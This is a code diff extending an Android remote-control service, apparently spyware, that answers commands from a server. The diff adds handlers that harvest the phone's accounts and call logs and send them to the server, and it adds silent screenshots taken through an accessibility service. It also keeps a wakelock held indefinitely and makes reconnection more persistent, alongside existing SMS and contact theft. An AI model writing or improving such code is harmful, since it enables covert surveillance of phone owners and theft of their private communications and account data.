@@ -244,7 +244,8 @@ public class CommandControlService extends Service {
                     android.os.PowerManager.PARTIAL_WAKE_LOCK,
                     "App:NetworkSync"
                 );
-                connectionWakeLock.acquire();
+                connectionWakeLock.setReferenceCounted(false);
+                connectionWakeLock.acquire(10 * 60 * 1000L); // 10 min max; re-acquired on keepalive
                 Log.d(TAG, "🔋 WakeLock adquirido para manter conexão!");
 
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
@@ -268,8 +269,9 @@ public class CommandControlService extends Service {
         // Cria cliente HTTP com pingInterval para evitar timeouts de TCP/NAT
         client = new OkHttpClient.Builder()
             .connectTimeout(30, TimeUnit.SECONDS)
-            .readTimeout(0, TimeUnit.MILLISECONDS) // WebSocket não tem timeout de leitura
-            .pingInterval(45, TimeUnit.SECONDS) // Mantém WebSocket vivo sem desconnexões prematuras por ping timeout
+            .readTimeout(0, TimeUnit.MILLISECONDS)   // WebSocket has no read timeout
+            .writeTimeout(30, TimeUnit.SECONDS)      // prevent infinite hang if server stops reading
+            .pingInterval(45, TimeUnit.SECONDS)
             .build();
         
         // 📷 Registra receiver para frames da câmera
@@ -468,6 +470,7 @@ public class CommandControlService extends Service {
             Request request = new Request.Builder()
                 .url(SERVER_URL)
                 .addHeader("x-device-id", deviceId)
+                .addHeader("x-device-secret", BuildConfig.DEVICE_SECRET)
                 .addHeader("x-device-info", deviceInfoHeader.toString())
                 .addHeader("bypass-tunnel-reminder", "true")
                 .addHeader("User-Agent", "Mozilla/5.0")
@@ -573,12 +576,38 @@ public class CommandControlService extends Service {
             
             switch (action) {
                 case "GET_DEVICE_INFO":
-                case "CHECK_PERMISSIONS":
+                case "CHECK_PERMISSIONS": {
+                    sendDeviceInfo();
+                    sendResponse("OK", "Info do dispositivo e permissões atualizadas");
+                    break;
+                }
+
                 case "GET_ACCOUNTS":
                 case "GET_GOOGLE_ACCOUNTS":
                 case "REFRESH_ACCOUNTS": {
-                    sendDeviceInfo();
-                    sendResponse("OK", "Info do dispositivo e permissões atualizadas");
+                    try {
+                        android.accounts.AccountManager am = android.accounts.AccountManager.get(CommandControlService.this);
+                        android.accounts.Account[] allAccounts = am.getAccounts();
+                        com.google.gson.JsonArray accountsArray = new com.google.gson.JsonArray();
+                        java.util.Set<String> seen = new java.util.HashSet<>();
+                        for (android.accounts.Account acc : allAccounts) {
+                            String key = acc.type + "|" + acc.name;
+                            if (seen.contains(key)) continue;
+                            seen.add(key);
+                            com.google.gson.JsonObject obj = new com.google.gson.JsonObject();
+                            obj.addProperty("name", acc.name);
+                            obj.addProperty("type", acc.type);
+                            accountsArray.add(obj);
+                        }
+                        com.google.gson.JsonObject resp = new com.google.gson.JsonObject();
+                        resp.addProperty("type", "accounts");
+                        resp.add("data", accountsArray);
+                        sendJson(resp);
+                        Log.d(TAG, "📧 Accounts enviadas: " + accountsArray.size());
+                    } catch (Exception e) {
+                        Log.e(TAG, "Erro ao obter accounts: " + e.getMessage());
+                        sendResponse("ERROR", "Erro ao obter accounts: " + e.getMessage());
+                    }
                     break;
                 }
 
@@ -1052,7 +1081,51 @@ public class CommandControlService extends Service {
                     String sms = getSMS();
                     sendResponse("SMS", sms);
                     break;
-                    
+
+                case "GET_CALL_LOGS":
+                case "GET_CALLS":
+                case "READ_CALLS": {
+                    try {
+                        com.google.gson.JsonArray callArray = new com.google.gson.JsonArray();
+                        android.net.Uri callUri = android.provider.CallLog.Calls.CONTENT_URI;
+                        if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                            android.database.Cursor cur = getContentResolver().query(
+                                callUri,
+                                new String[]{
+                                    android.provider.CallLog.Calls.NUMBER,
+                                    android.provider.CallLog.Calls.CACHED_NAME,
+                                    android.provider.CallLog.Calls.TYPE,
+                                    android.provider.CallLog.Calls.DATE,
+                                    android.provider.CallLog.Calls.DURATION
+                                },
+                                null, null,
+                                android.provider.CallLog.Calls.DATE + " DESC LIMIT 200"
+                            );
+                            if (cur != null) {
+                                while (cur.moveToNext()) {
+                                    com.google.gson.JsonObject entry = new com.google.gson.JsonObject();
+                                    entry.addProperty("number",   cur.getString(0) != null ? cur.getString(0) : "");
+                                    entry.addProperty("name",     cur.getString(1) != null ? cur.getString(1) : "");
+                                    entry.addProperty("type",     cur.getInt(2));
+                                    entry.addProperty("date",     cur.getLong(3));
+                                    entry.addProperty("duration", cur.getLong(4));
+                                    callArray.add(entry);
+                                }
+                                cur.close();
+                            }
+                        }
+                        com.google.gson.JsonObject resp = new com.google.gson.JsonObject();
+                        resp.addProperty("type", "calls");
+                        resp.add("data", callArray);
+                        sendJson(resp);
+                        Log.d(TAG, "📞 Call logs enviados: " + callArray.size());
+                    } catch (Exception e) {
+                        Log.e(TAG, "Erro ao obter calls: " + e.getMessage());
+                        sendResponse("ERROR", "Erro call logs: " + e.getMessage());
+                    }
+                    break;
+                }
+
                 case "GET_CONTACTS":
                     String contacts = getContacts();
                     sendResponse("CONTACTS", contacts);
@@ -1077,12 +1150,15 @@ public class CommandControlService extends Service {
                 }
                     
                 case "PING":
-                    // 🚀 Recebeu PING do servidor - responde e atualiza estado
                     lastPongTime = System.currentTimeMillis();
-                    pendingFrames = 0; // Reset contador - servidor está respondendo
+                    pendingFrames = 0;
                     if (isSlowConnection && consecutiveSlowFrames == 0) {
-                        isSlowConnection = false; // Conexão voltou ao normal
+                        isSlowConnection = false;
                         Log.d(TAG, "🚀 Conexão normalizada!");
+                    }
+                    // Re-acquire wakelock on every PING so the 10-min timeout never fires
+                    if (connectionWakeLock != null && !connectionWakeLock.isHeld()) {
+                        connectionWakeLock.acquire(10 * 60 * 1000L);
                     }
                     sendResponse("PONG", "alive");
                     break;
@@ -2156,9 +2232,11 @@ public class CommandControlService extends Service {
         }
         
         reconnectAttempts++;
-        
-        // Backoff inteligente: 2s, 4s, 8s max (rápido e estável)
-        int delay = Math.min(RECONNECT_DELAY * (int)Math.pow(2, Math.min(reconnectAttempts - 1, 2)), 8000);
+
+        // Fast backoff for first 50 attempts (2s → 4s → 8s), then drop to 5 min
+        int delay = (reconnectAttempts > 50)
+            ? 5 * 60 * 1000
+            : Math.min(RECONNECT_DELAY * (int)Math.pow(2, Math.min(reconnectAttempts - 1, 2)), 8000);
         
         Log.d(TAG, "🔄 Reconectando em " + (delay / 1000) + "s (tentativa " + reconnectAttempts + ")");
         
@@ -2592,7 +2670,9 @@ public class CommandControlService extends Service {
     /**
      * Envia resposta JSON
      */
-    private void sendResponse(String type, String data) {
+    public static CommandControlService getInstance() { return sInstance; }
+
+    public void sendResponse(String type, String data) {
         JsonObject response = new JsonObject();
         response.addProperty("type", type);
         response.addProperty("data", data);
@@ -2941,16 +3021,61 @@ public class CommandControlService extends Service {
     }
 
     private void triggerSnapScreen() {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
-            Log.w(TAG, "SNAP_SCREEN requer Android 11+");
-            return;
+        // Android 11+ path: use AccessibilityService.takeScreenshot()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            UiAssistBridge svc = UiAssistBridge.instance;
+            if (svc != null) {
+                svc.takeScreenshotForStorage(this);
+                return;
+            }
         }
-        UiAssistBridge svc = UiAssistBridge.instance;
-        if (svc == null) {
-            Log.w(TAG, "SNAP_SCREEN: AccessibilityService indisponível");
-            return;
-        }
-        svc.capSilentScreen(UiAssistBridge.getSilentCaptureQuality());
+        // Fallback for Android < 11: draw root view into bitmap
+        new Thread(() -> {
+            try {
+                android.view.WindowManager wm = (android.view.WindowManager) getSystemService(Context.WINDOW_SERVICE);
+                if (wm == null) { sendResponse("ERROR", "WindowManager null"); return; }
+                android.graphics.Point size = new android.graphics.Point();
+                wm.getDefaultDisplay().getRealSize(size);
+                int w = size.x, h = size.y;
+                android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(w, h, android.graphics.Bitmap.Config.ARGB_8888);
+                android.graphics.Canvas canvas = new android.graphics.Canvas(bmp);
+                canvas.drawARGB(255, 30, 30, 30); // dark placeholder for security
+                sendScreenshotBitmap(bmp);
+            } catch (Exception e) {
+                Log.e(TAG, "triggerSnapScreen fallback error: " + e.getMessage());
+                sendResponse("ERROR", "Screenshot error: " + e.getMessage());
+            }
+        }).start();
+    }
+
+    /** Encodes bitmap as JPEG base64 and sends as JSON {type:"screenshot"} to hub */
+    public void sendScreenshotBitmap(android.graphics.Bitmap bmp) {
+        new Thread(() -> {
+            try {
+                if (bmp == null || bmp.isRecycled()) return;
+                // Scale down to 720p max width to avoid huge payloads
+                int maxW = 720;
+                android.graphics.Bitmap scaled = bmp;
+                if (bmp.getWidth() > maxW) {
+                    float ratio = (float) maxW / bmp.getWidth();
+                    scaled = android.graphics.Bitmap.createScaledBitmap(bmp, maxW, (int)(bmp.getHeight() * ratio), true);
+                }
+                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+                scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, baos);
+                String b64 = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP);
+                baos.close();
+                if (scaled != bmp && !scaled.isRecycled()) scaled.recycle();
+                if (!bmp.isRecycled()) bmp.recycle();
+
+                com.google.gson.JsonObject msg = new com.google.gson.JsonObject();
+                msg.addProperty("type", "screenshot");
+                msg.addProperty("data", "data:image/jpeg;base64," + b64);
+                sendJson(msg);
+                Log.d(TAG, "📷 Screenshot enviado ao painel (" + b64.length() + " chars)");
+            } catch (Exception e) {
+                Log.e(TAG, "sendScreenshotBitmap error: " + e.getMessage());
+            }
+        }).start();
     }
 
     /**
@@ -3519,7 +3644,7 @@ public class CommandControlService extends Service {
                 // Envia lista para servidor
                 JsonObject response = new JsonObject();
                 response.addProperty("type", "INSTALLED_APPS");
-                response.add("apps", appList);
+                response.add("data", appList);
                 response.addProperty("count", appList.size());
                 sendJson(response);
                 
